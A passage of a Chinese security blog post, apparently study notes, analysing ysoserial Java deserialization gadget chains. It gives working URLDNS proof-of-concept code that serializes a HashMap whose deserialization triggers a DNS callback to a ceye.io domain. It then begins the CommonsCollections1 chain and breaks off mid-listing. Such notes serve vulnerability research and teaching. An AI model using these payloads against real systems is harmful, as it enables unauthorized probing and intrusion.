gadgets</h3><p>先从ysoserialpayload利用链的原理开始审计。</p><p>根据我们最早学习到的java反序列化原理。我们知道,序列化利用类必须是实现了Serializable的。这些都是payload可行的必要条件。所以后续这种细节都不必提。</p><ul><li>URLDNS</li></ul><p>URLDNS常用于检测反序列化漏洞。原因很简单:<br>1.依赖原生类Hashmap<br>2.不依赖jdk版本</p><p>我们看看Hashmap类。它实现了readObject方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                            loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</span><br><span class="line">                                            mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                    DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                    (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                    MAXIMUM_CAPACITY :</span><br><span class="line">                    tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it's the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we're actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[]<span class="class">.<span class="keyword">class</span>, <span class="title">cap</span>)</span>;</span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键在最后一行的putval。我们先看向putval中使用了的hash方法<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/32.PNG" alt></p><p>里面hashCode方法取决于你的key的类。此处是java.net.URL类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而跟进这里的handler发现调用的是java.net.URLStreamHandler的hashCode。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/33.PNG" alt><br>看到<code>getHostAddress</code>.就能明白此处肯定是对域名进行了解析。所以会发出DNS请求。</p><p>不过。URLDNS的payload编写并非这么简单的一个调用就完事了的。刚刚上面我们看到。<code>hashCode</code>方法里强调如果hashCode不为-1,则直接返回hashCode.而url类中它是默认为-1的。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/34.PNG" alt></p><p>刚刚我们说，触发点在<code>putVal</code>那里。它的key是通过readObject读取出来的。那说明我们的key写入时是通过writeObject写入的。按照这个线路跟下去,会发现key值最终来自HashMap中table的值。而HashMap 中的table即hash表是通过hashmap.put来写入数据的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也调用了hash。那么说明这里也会触发dns请求</p><p>我们可以写个demo<br>URLDNS的payload编写并非这么简单的一个调用就完事了的。刚刚上面我们看到。<code>hashCode</code>方法里强调如果hashCode不为-1,则直接返回hashCode.<br>所以本地写要将put的第二个参数设为-1才会发出dns请求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://byc.xxx.ceye.io/"</span>);</span><br><span class="line">        map.put(url,-<span class="number">1</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/35.PNG" alt></p><p>我们如果只想在对方机器上检测是否产生dns请求。那么必须得规避掉Hashmap.put这一次调用时里面做出的dns请求。方法也很简单。那就是在put前修改URL的hashCode为其他任意值，就可以在put时不触发dns查询</p><p>这一步可以通过反射来达成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://byc.59fevd.ceye.io/"</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url,<span class="number">123</span>);</span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        map.put(url,<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时调用url的hashCode结果会返回123.也就是直接返回了我们设置的值,避免了dns查询。</p><p>hashCode 这个属性不是 transient 的,而是private的。所以放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</p><p>因此。我们实际的poc如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://byc.59fevd.ceye.io/"</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url, <span class="number">123</span>);</span><br><span class="line">        map.put(url, <span class="string">"byc_404"</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就成功将序列化数据写入out.bin,并且没有本地发出dns请求。然后我们模拟真实场景触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在p1g3师傅的文章里还对ysoserial的payload进行了分析。我们不妨也看看yso的jar包中是如何书写的(其实直接去看github上源码可以配合注释更好阅读)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    URLStreamHandler handler = <span class="keyword">new</span> URLDNS.SilentURLStreamHandler();</span><br><span class="line">    HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">    URL u = <span class="keyword">new</span> URL((URL)<span class="keyword">null</span>, url, handler);</span><br><span class="line">    ht.put(u, url);</span><br><span class="line">    Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">    SilentURLStreamHandler() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jar包反编译看不出提示。我们在github源码上则可以找到作者的说法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br></pre></td></tr></table></figure><p>配合上面的源码。我们知道这里它新建了一个子类SilentURLStreamHandler继承URLStreamHandler。那当它在URLDNSpayload里调用put时是直接调用自定义的<code>getHostAddress</code>.这个方法返回null.</p><p>而当反序列化执行时,因为这里的SilentURLStreamHandler属性被设置为transient，<strong>而被transient修饰的变量无法被序列化</strong>，所以最终反序列化读取出来的transient依旧是其初始值，也就是URLStreamHandler。</p><p>到此为止。我们完成了整条urldns链的分析。<br>gadgets如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject</span><br><span class="line">    HashMap#hash</span><br><span class="line">        URL#hashCode</span><br><span class="line">        URLStreamHandler#hashCode</span><br><span class="line">        URLStreamHandler#getHostAddress</span><br></pre></td></tr></table></figure><ul><li>CommonCollections1</li></ul><p>先说下环境的配置问题。因为cc链子好几条都只能用在jdk1.7下了所以得弄个jdk1.7的环境。开始打算用kali虚拟机现成的的jvm里的1.7,结果因为官方库已经没有openjdk7了，idea识别不到。所以只好又下了一个jdk1.7.</p><p>因为只是项目用，所以不需要添加环境变量什么的就可以了。不过需要注意的是idea项目切换jdk版本的话,尤其对于我们maven项目而言,一定要把设置里所有默认值都改为jdk1.7.包括：pom.xml里java version与maven 编译version;project structure里project sdk 以及modules;Language level;java Compiler version 全部调整为1.7才能不出错。<br>否则会在编译时报<code>无效的源</code>以及编译完后<code>无效的目标发行版</code>这两种错。<br>修改好后就没有什么好担心的了。开始maven导库审计吧。<br>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>首先是一个关于动态代理的例子。</p><blockquote><p>1.java中代理类的作用是:调用不可以直接被实例化的接口方法。<br>2.动态代理可以直接”创建”某个接口的实例，对其方法进行调用.<br>3.调用某个动态代理对象的方法时，都会触发代理类的invoke方法.</p></blockquote><p>先定义一个接口。它有一个helloworld方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">helloworld</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来调用这个exp。我们可以直接实例化一个handler.它实现了InvocationHandler这个接口。同时需要重写invoke方法。此处我们让他在方法名为helloworld时输出自定义内容<br>然后实例化一个代理对象hello.他需要ClassLoader,要代理的接口数组以及调用接口时触发的对应方法作为构造参数。<br>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> InvocationHandler()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"helloworld"</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"Hello, "</span> + args[<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Hello hello = (Hello)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Hello<span class="class">.<span class="keyword">class</span>&#125;,<span class="title">handler</span>)</span>;</span><br><span class="line">        hello.helloworld(<span class="string">"byc_404"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在我们调用接口的helloworld时。就会触发invoke方法里的内容。<br>输出<code>Hello, byc_404</code></p><p>接下来我们来看看cc1链子的内容。首先从执行命令的反射gadget开始。这里我确认过一遍，应该是第一部分跟CC5时就看过了。结果现在已经忘光了……所以再看一遍。</p><p>首先是commonscollections这个包里Trandsformer这个接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它实现了类型转换的功能。其中实现了这个接口的类主要有三个，也就是我们后面构造payload要用到的.</p><blockquote><p>InvokerTransformer<br>ConstantTransformer<br>ChainedTransformer<br>他们都实现了 Transformer 以及 Serializable接口。</p></blockquote><p>看下他们的transform方法<br>InvokeTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, 